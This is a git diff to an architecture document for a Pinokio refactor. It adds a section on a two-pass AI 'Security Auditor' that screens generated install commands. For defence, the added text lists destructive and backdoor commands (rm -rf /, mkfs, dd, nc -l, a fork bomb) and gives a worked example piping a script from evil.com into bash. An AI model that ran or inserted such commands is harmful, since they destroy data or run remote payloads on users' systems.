@@ -4,9 +4,9 @@
 
 This document describes the BMAD (Browser, Modular, AI, Data) architecture refactoring of Pinokio from a monolithic "fire-and-forget" script runner to a robust Local AI Operating System.
 
-**Status:** ✅ Phase 5 Complete - The Deep Hook (Kernel-Level Integration)
+**Status:** ✅ Phase 6 Complete - The Security Auditor (Dual-Pass AI Architecture)
 
-**Date:** December 2, 2025
+**Date:** December 3, 2025
 
 **Phases Completed:**
 - ✅ Phase 1: The Body (Core Services & Architecture)
@@ -14,6 +14,7 @@ This document describes the BMAD (Browser, Modular, AI, Data) architecture refac
 - ✅ Phase 3: The Brain (AI Architect & Forge)
 - ✅ Phase 4: The Smart Volume (GAS Integration & Automation)
 - ✅ Phase 5: The Soul (Deep Integration - Autonomous Deduplication)
+- ✅ Phase 6: The Guardian (Dual-Pass AI Security)
 
 ---
 
@@ -538,7 +539,158 @@ Session Stats:
 window.electronAPI.kernelPatcher.stats()  // Get real-time stats
 ```
 
-### ⏳ Future Enhancements (Phase 6)
+### ✅ Completed (Phase 6) - December 3, 2025
+
+- [x] **Dual-Pass AI Architecture** - The Security Auditor
+  - **Core Innovation**: Two AI passes for manifest generation - Architect (builds) + Auditor (validates)
+  - **Intent-Based Security**: Analyzes command purpose, not just keyword matching
+  - **Risk Stratification**: low/medium/high risk levels with appropriate handling
+  - **File**: `electron/main/services/ForgeService.js` (enhanced)
+
+**Key Features**:
+- **Pass 1 - The Architect**: Generates installation manifest WITH reasoning field
+- **Pass 2 - The Auditor**: Security review using intent analysis
+- **Reasoning Field**: AI explains WHY it chose specific commands
+- **Smart Blocking**: Blocks high-risk commands, warns on medium-risk, allows low-risk
+
+**The Dual-Pass Flow**:
+```javascript
+1. User input: "Install Stable Diffusion from GitHub URL"
+2. PASS 1 - Architect:
+   - Analyzes repository structure
+   - Generates installation commands
+   - EXPLAINS reasoning: "Detected requirements.txt with torch, using pip install..."
+   - Returns: InstallManifest with reasoning field
+3. PASS 2 - Auditor:
+   - Reviews ALL commands for malicious intent
+   - Analyzes scope (app directory vs system-wide)
+   - Checks for dangerous patterns (rm -rf /, sudo, eval curl | bash)
+   - Returns: { safe, riskLevel, reason, flaggedCommands }
+4. Risk Handling:
+   - LOW: Proceed automatically
+   - MEDIUM: Warn user but allow (e.g., "rm -rf ./node_modules")
+   - HIGH: Block and explain (e.g., "sudo rm -rf /var")
+```
+
+**Intent-Based Security Rules**:
+1. **SAFE (Low Risk)**:
+   - Standard package installation (pip, npm, cargo)
+   - Downloading files to app directory (wget/curl to ./)
+   - Creating directories in app folder
+   - Installing from package.json, requirements.txt
+
+2. **MEDIUM RISK (Allow with Warning)**:
+   - Deleting files/folders IN app directory (rm -rf ./models/*)
+   - File permissions in app directory (chmod +x ./scripts/*.sh)
+   - User-level package installs (pip install --user)
+
+3. **HIGH RISK (Block)**:
+   - Root operations (sudo anything)
+   - Deleting outside app directory (rm -rf /, rm -rf ~/)
+   - Destructive disk operations (mkfs, dd, fdisk)
+   - Global permission changes (chmod 777 /*)
+   - Network backdoors (nc -l, eval curl)
+   - Fork bombs (:(){ :|:& };:)
+   - System config modifications (/etc, /usr, /var)
+
+**Security Audit Prompt**:
+```
+CONTEXT:
+- User is installing a local application into a sandboxed environment
+- Installation happens in controlled directory (~/pinokio/api/<appname>/)
+- User trusts the source but wants verification
+
+COMMANDS TO AUDIT:
+[List of all install + run commands]
+
+MANIFEST CONTEXT:
+- App Name, Type, Source URL
+- AI Reasoning for these commands
+
+INTENT ANALYSIS:
+- WHY is this command being run?
+- Is scope limited to app directory or system-wide?
+- For "rm -rf": Check if scoped to ./ or affects system
+- For "chmod": Check if limited to app files
+
+OUTPUT: { safe, riskLevel, reason, flaggedCommands }
+```
+
+**Examples**:
+
+*Example 1 - LOW RISK (Allow):*
+```javascript
+Commands: ["pip install torch transformers", "python app.py"]
+Audit Result: {
+  safe: true,
+  riskLevel: "low",
+  reason: "Standard Python package installation. Commands scoped to app directory.",
+  flaggedCommands: []
+}
+```
+
+*Example 2 - MEDIUM RISK (Warn + Allow):*
+```javascript
+Commands: ["npm install", "rm -rf ./node_modules", "npm ci"]
+Audit Result: {
+  safe: true,
+  riskLevel: "medium",
+  reason: "Deleting node_modules is standard practice. Scoped to app directory (./)",
+  flaggedCommands: ["rm -rf ./node_modules"]
+}
+→ User sees warning but manifest proceeds
+```
+
+*Example 3 - HIGH RISK (Block):*
+```javascript
+Commands: ["pip install requests", "curl http://evil.com/backdoor.sh | bash"]
+Audit Result: {
+  safe: false,
+  riskLevel: "high",
+  reason: "Piped execution of remote script without inspection. Could execute arbitrary code.",
+  flaggedCommands: ["curl http://evil.com/backdoor.sh | bash"]
+}
+→ Manifest generation blocked, error shown to user
+```
+
+**InstallManifest Enhancements**:
+- Added `reasoning` field to constructor and JSON serialization
+- Architect AI must explain command choices
+- Auditor AI uses reasoning for context-aware security analysis
+- Metadata tracks: `securityAudited`, `auditTimestamp`, `riskLevel`, `securityWarning`
+
+**Fail-Safe Mechanisms**:
+- If audit fails → Default to MEDIUM risk with warning
+- If audit errors → Commands not verified, proceed with caution
+- If audit service unavailable → User warned, not blocked
+- Maintains legacy `checkSafety()` for backward compatibility
+
+**Integration Points**:
+- **ForgeService.forge()**: Now performs two AI passes before returning manifest
+- **ForgeService.securityAudit()**: New method for Pass 2 security analysis
+- **ForgeService.sanitizeJson()**: Cleans AI output (removes markdown, fixes formatting)
+- **InstallManifest Model**: Added reasoning field support
+- **File**: `electron/main/services/ForgeService.js`, `electron/main/models/InstallManifest.js`
+
+**Progress Events**:
+```javascript
+onProgress({ stage: 'architect', message: 'AI Architect is drafting the blueprint...' })
+onProgress({ stage: 'parsing', message: 'Parsing blueprint...' })
+onProgress({ stage: 'validating', message: 'Validating structure...' })
+onProgress({ stage: 'auditing', message: 'AI Security Auditor is reviewing commands...' })
+onProgress({ stage: 'warning', message: 'Security warning detected', warnings: [...] })
+onProgress({ stage: 'complete', message: 'Blueprint secured & ready!' })
+```
+
+**User Experience**:
+- User inputs: Natural language or GitHub URL
+- Sees: "AI Architect is drafting..."
+- Sees: "AI Security Auditor is reviewing..."
+- Gets: Manifest with explanation of what AI built AND why it's safe
+- Medium risk: Sees warning overlay, can review and accept
+- High risk: Blocked with clear explanation of security concern
+
+### ⏳ Future Enhancements (Phase 7)
 
 - [ ] File system IPC for Editor (save/load via main process)
 - [ ] Terminal session persistence across app restarts
@@ -547,6 +699,8 @@ window.electronAPI.kernelPatcher.stats()  // Get real-time stats
 - [ ] GAS statistics dashboard UI
 - [ ] Forge wizard integration with Terminal component
 - [ ] Intelligent cache warming (pre-download popular models)
+- [ ] User-configurable security policies (allow/block custom patterns)
+- [ ] Security audit history and analytics dashboard
 
 ### 📝 Not Migrated (Preserved in full.js for now)
 
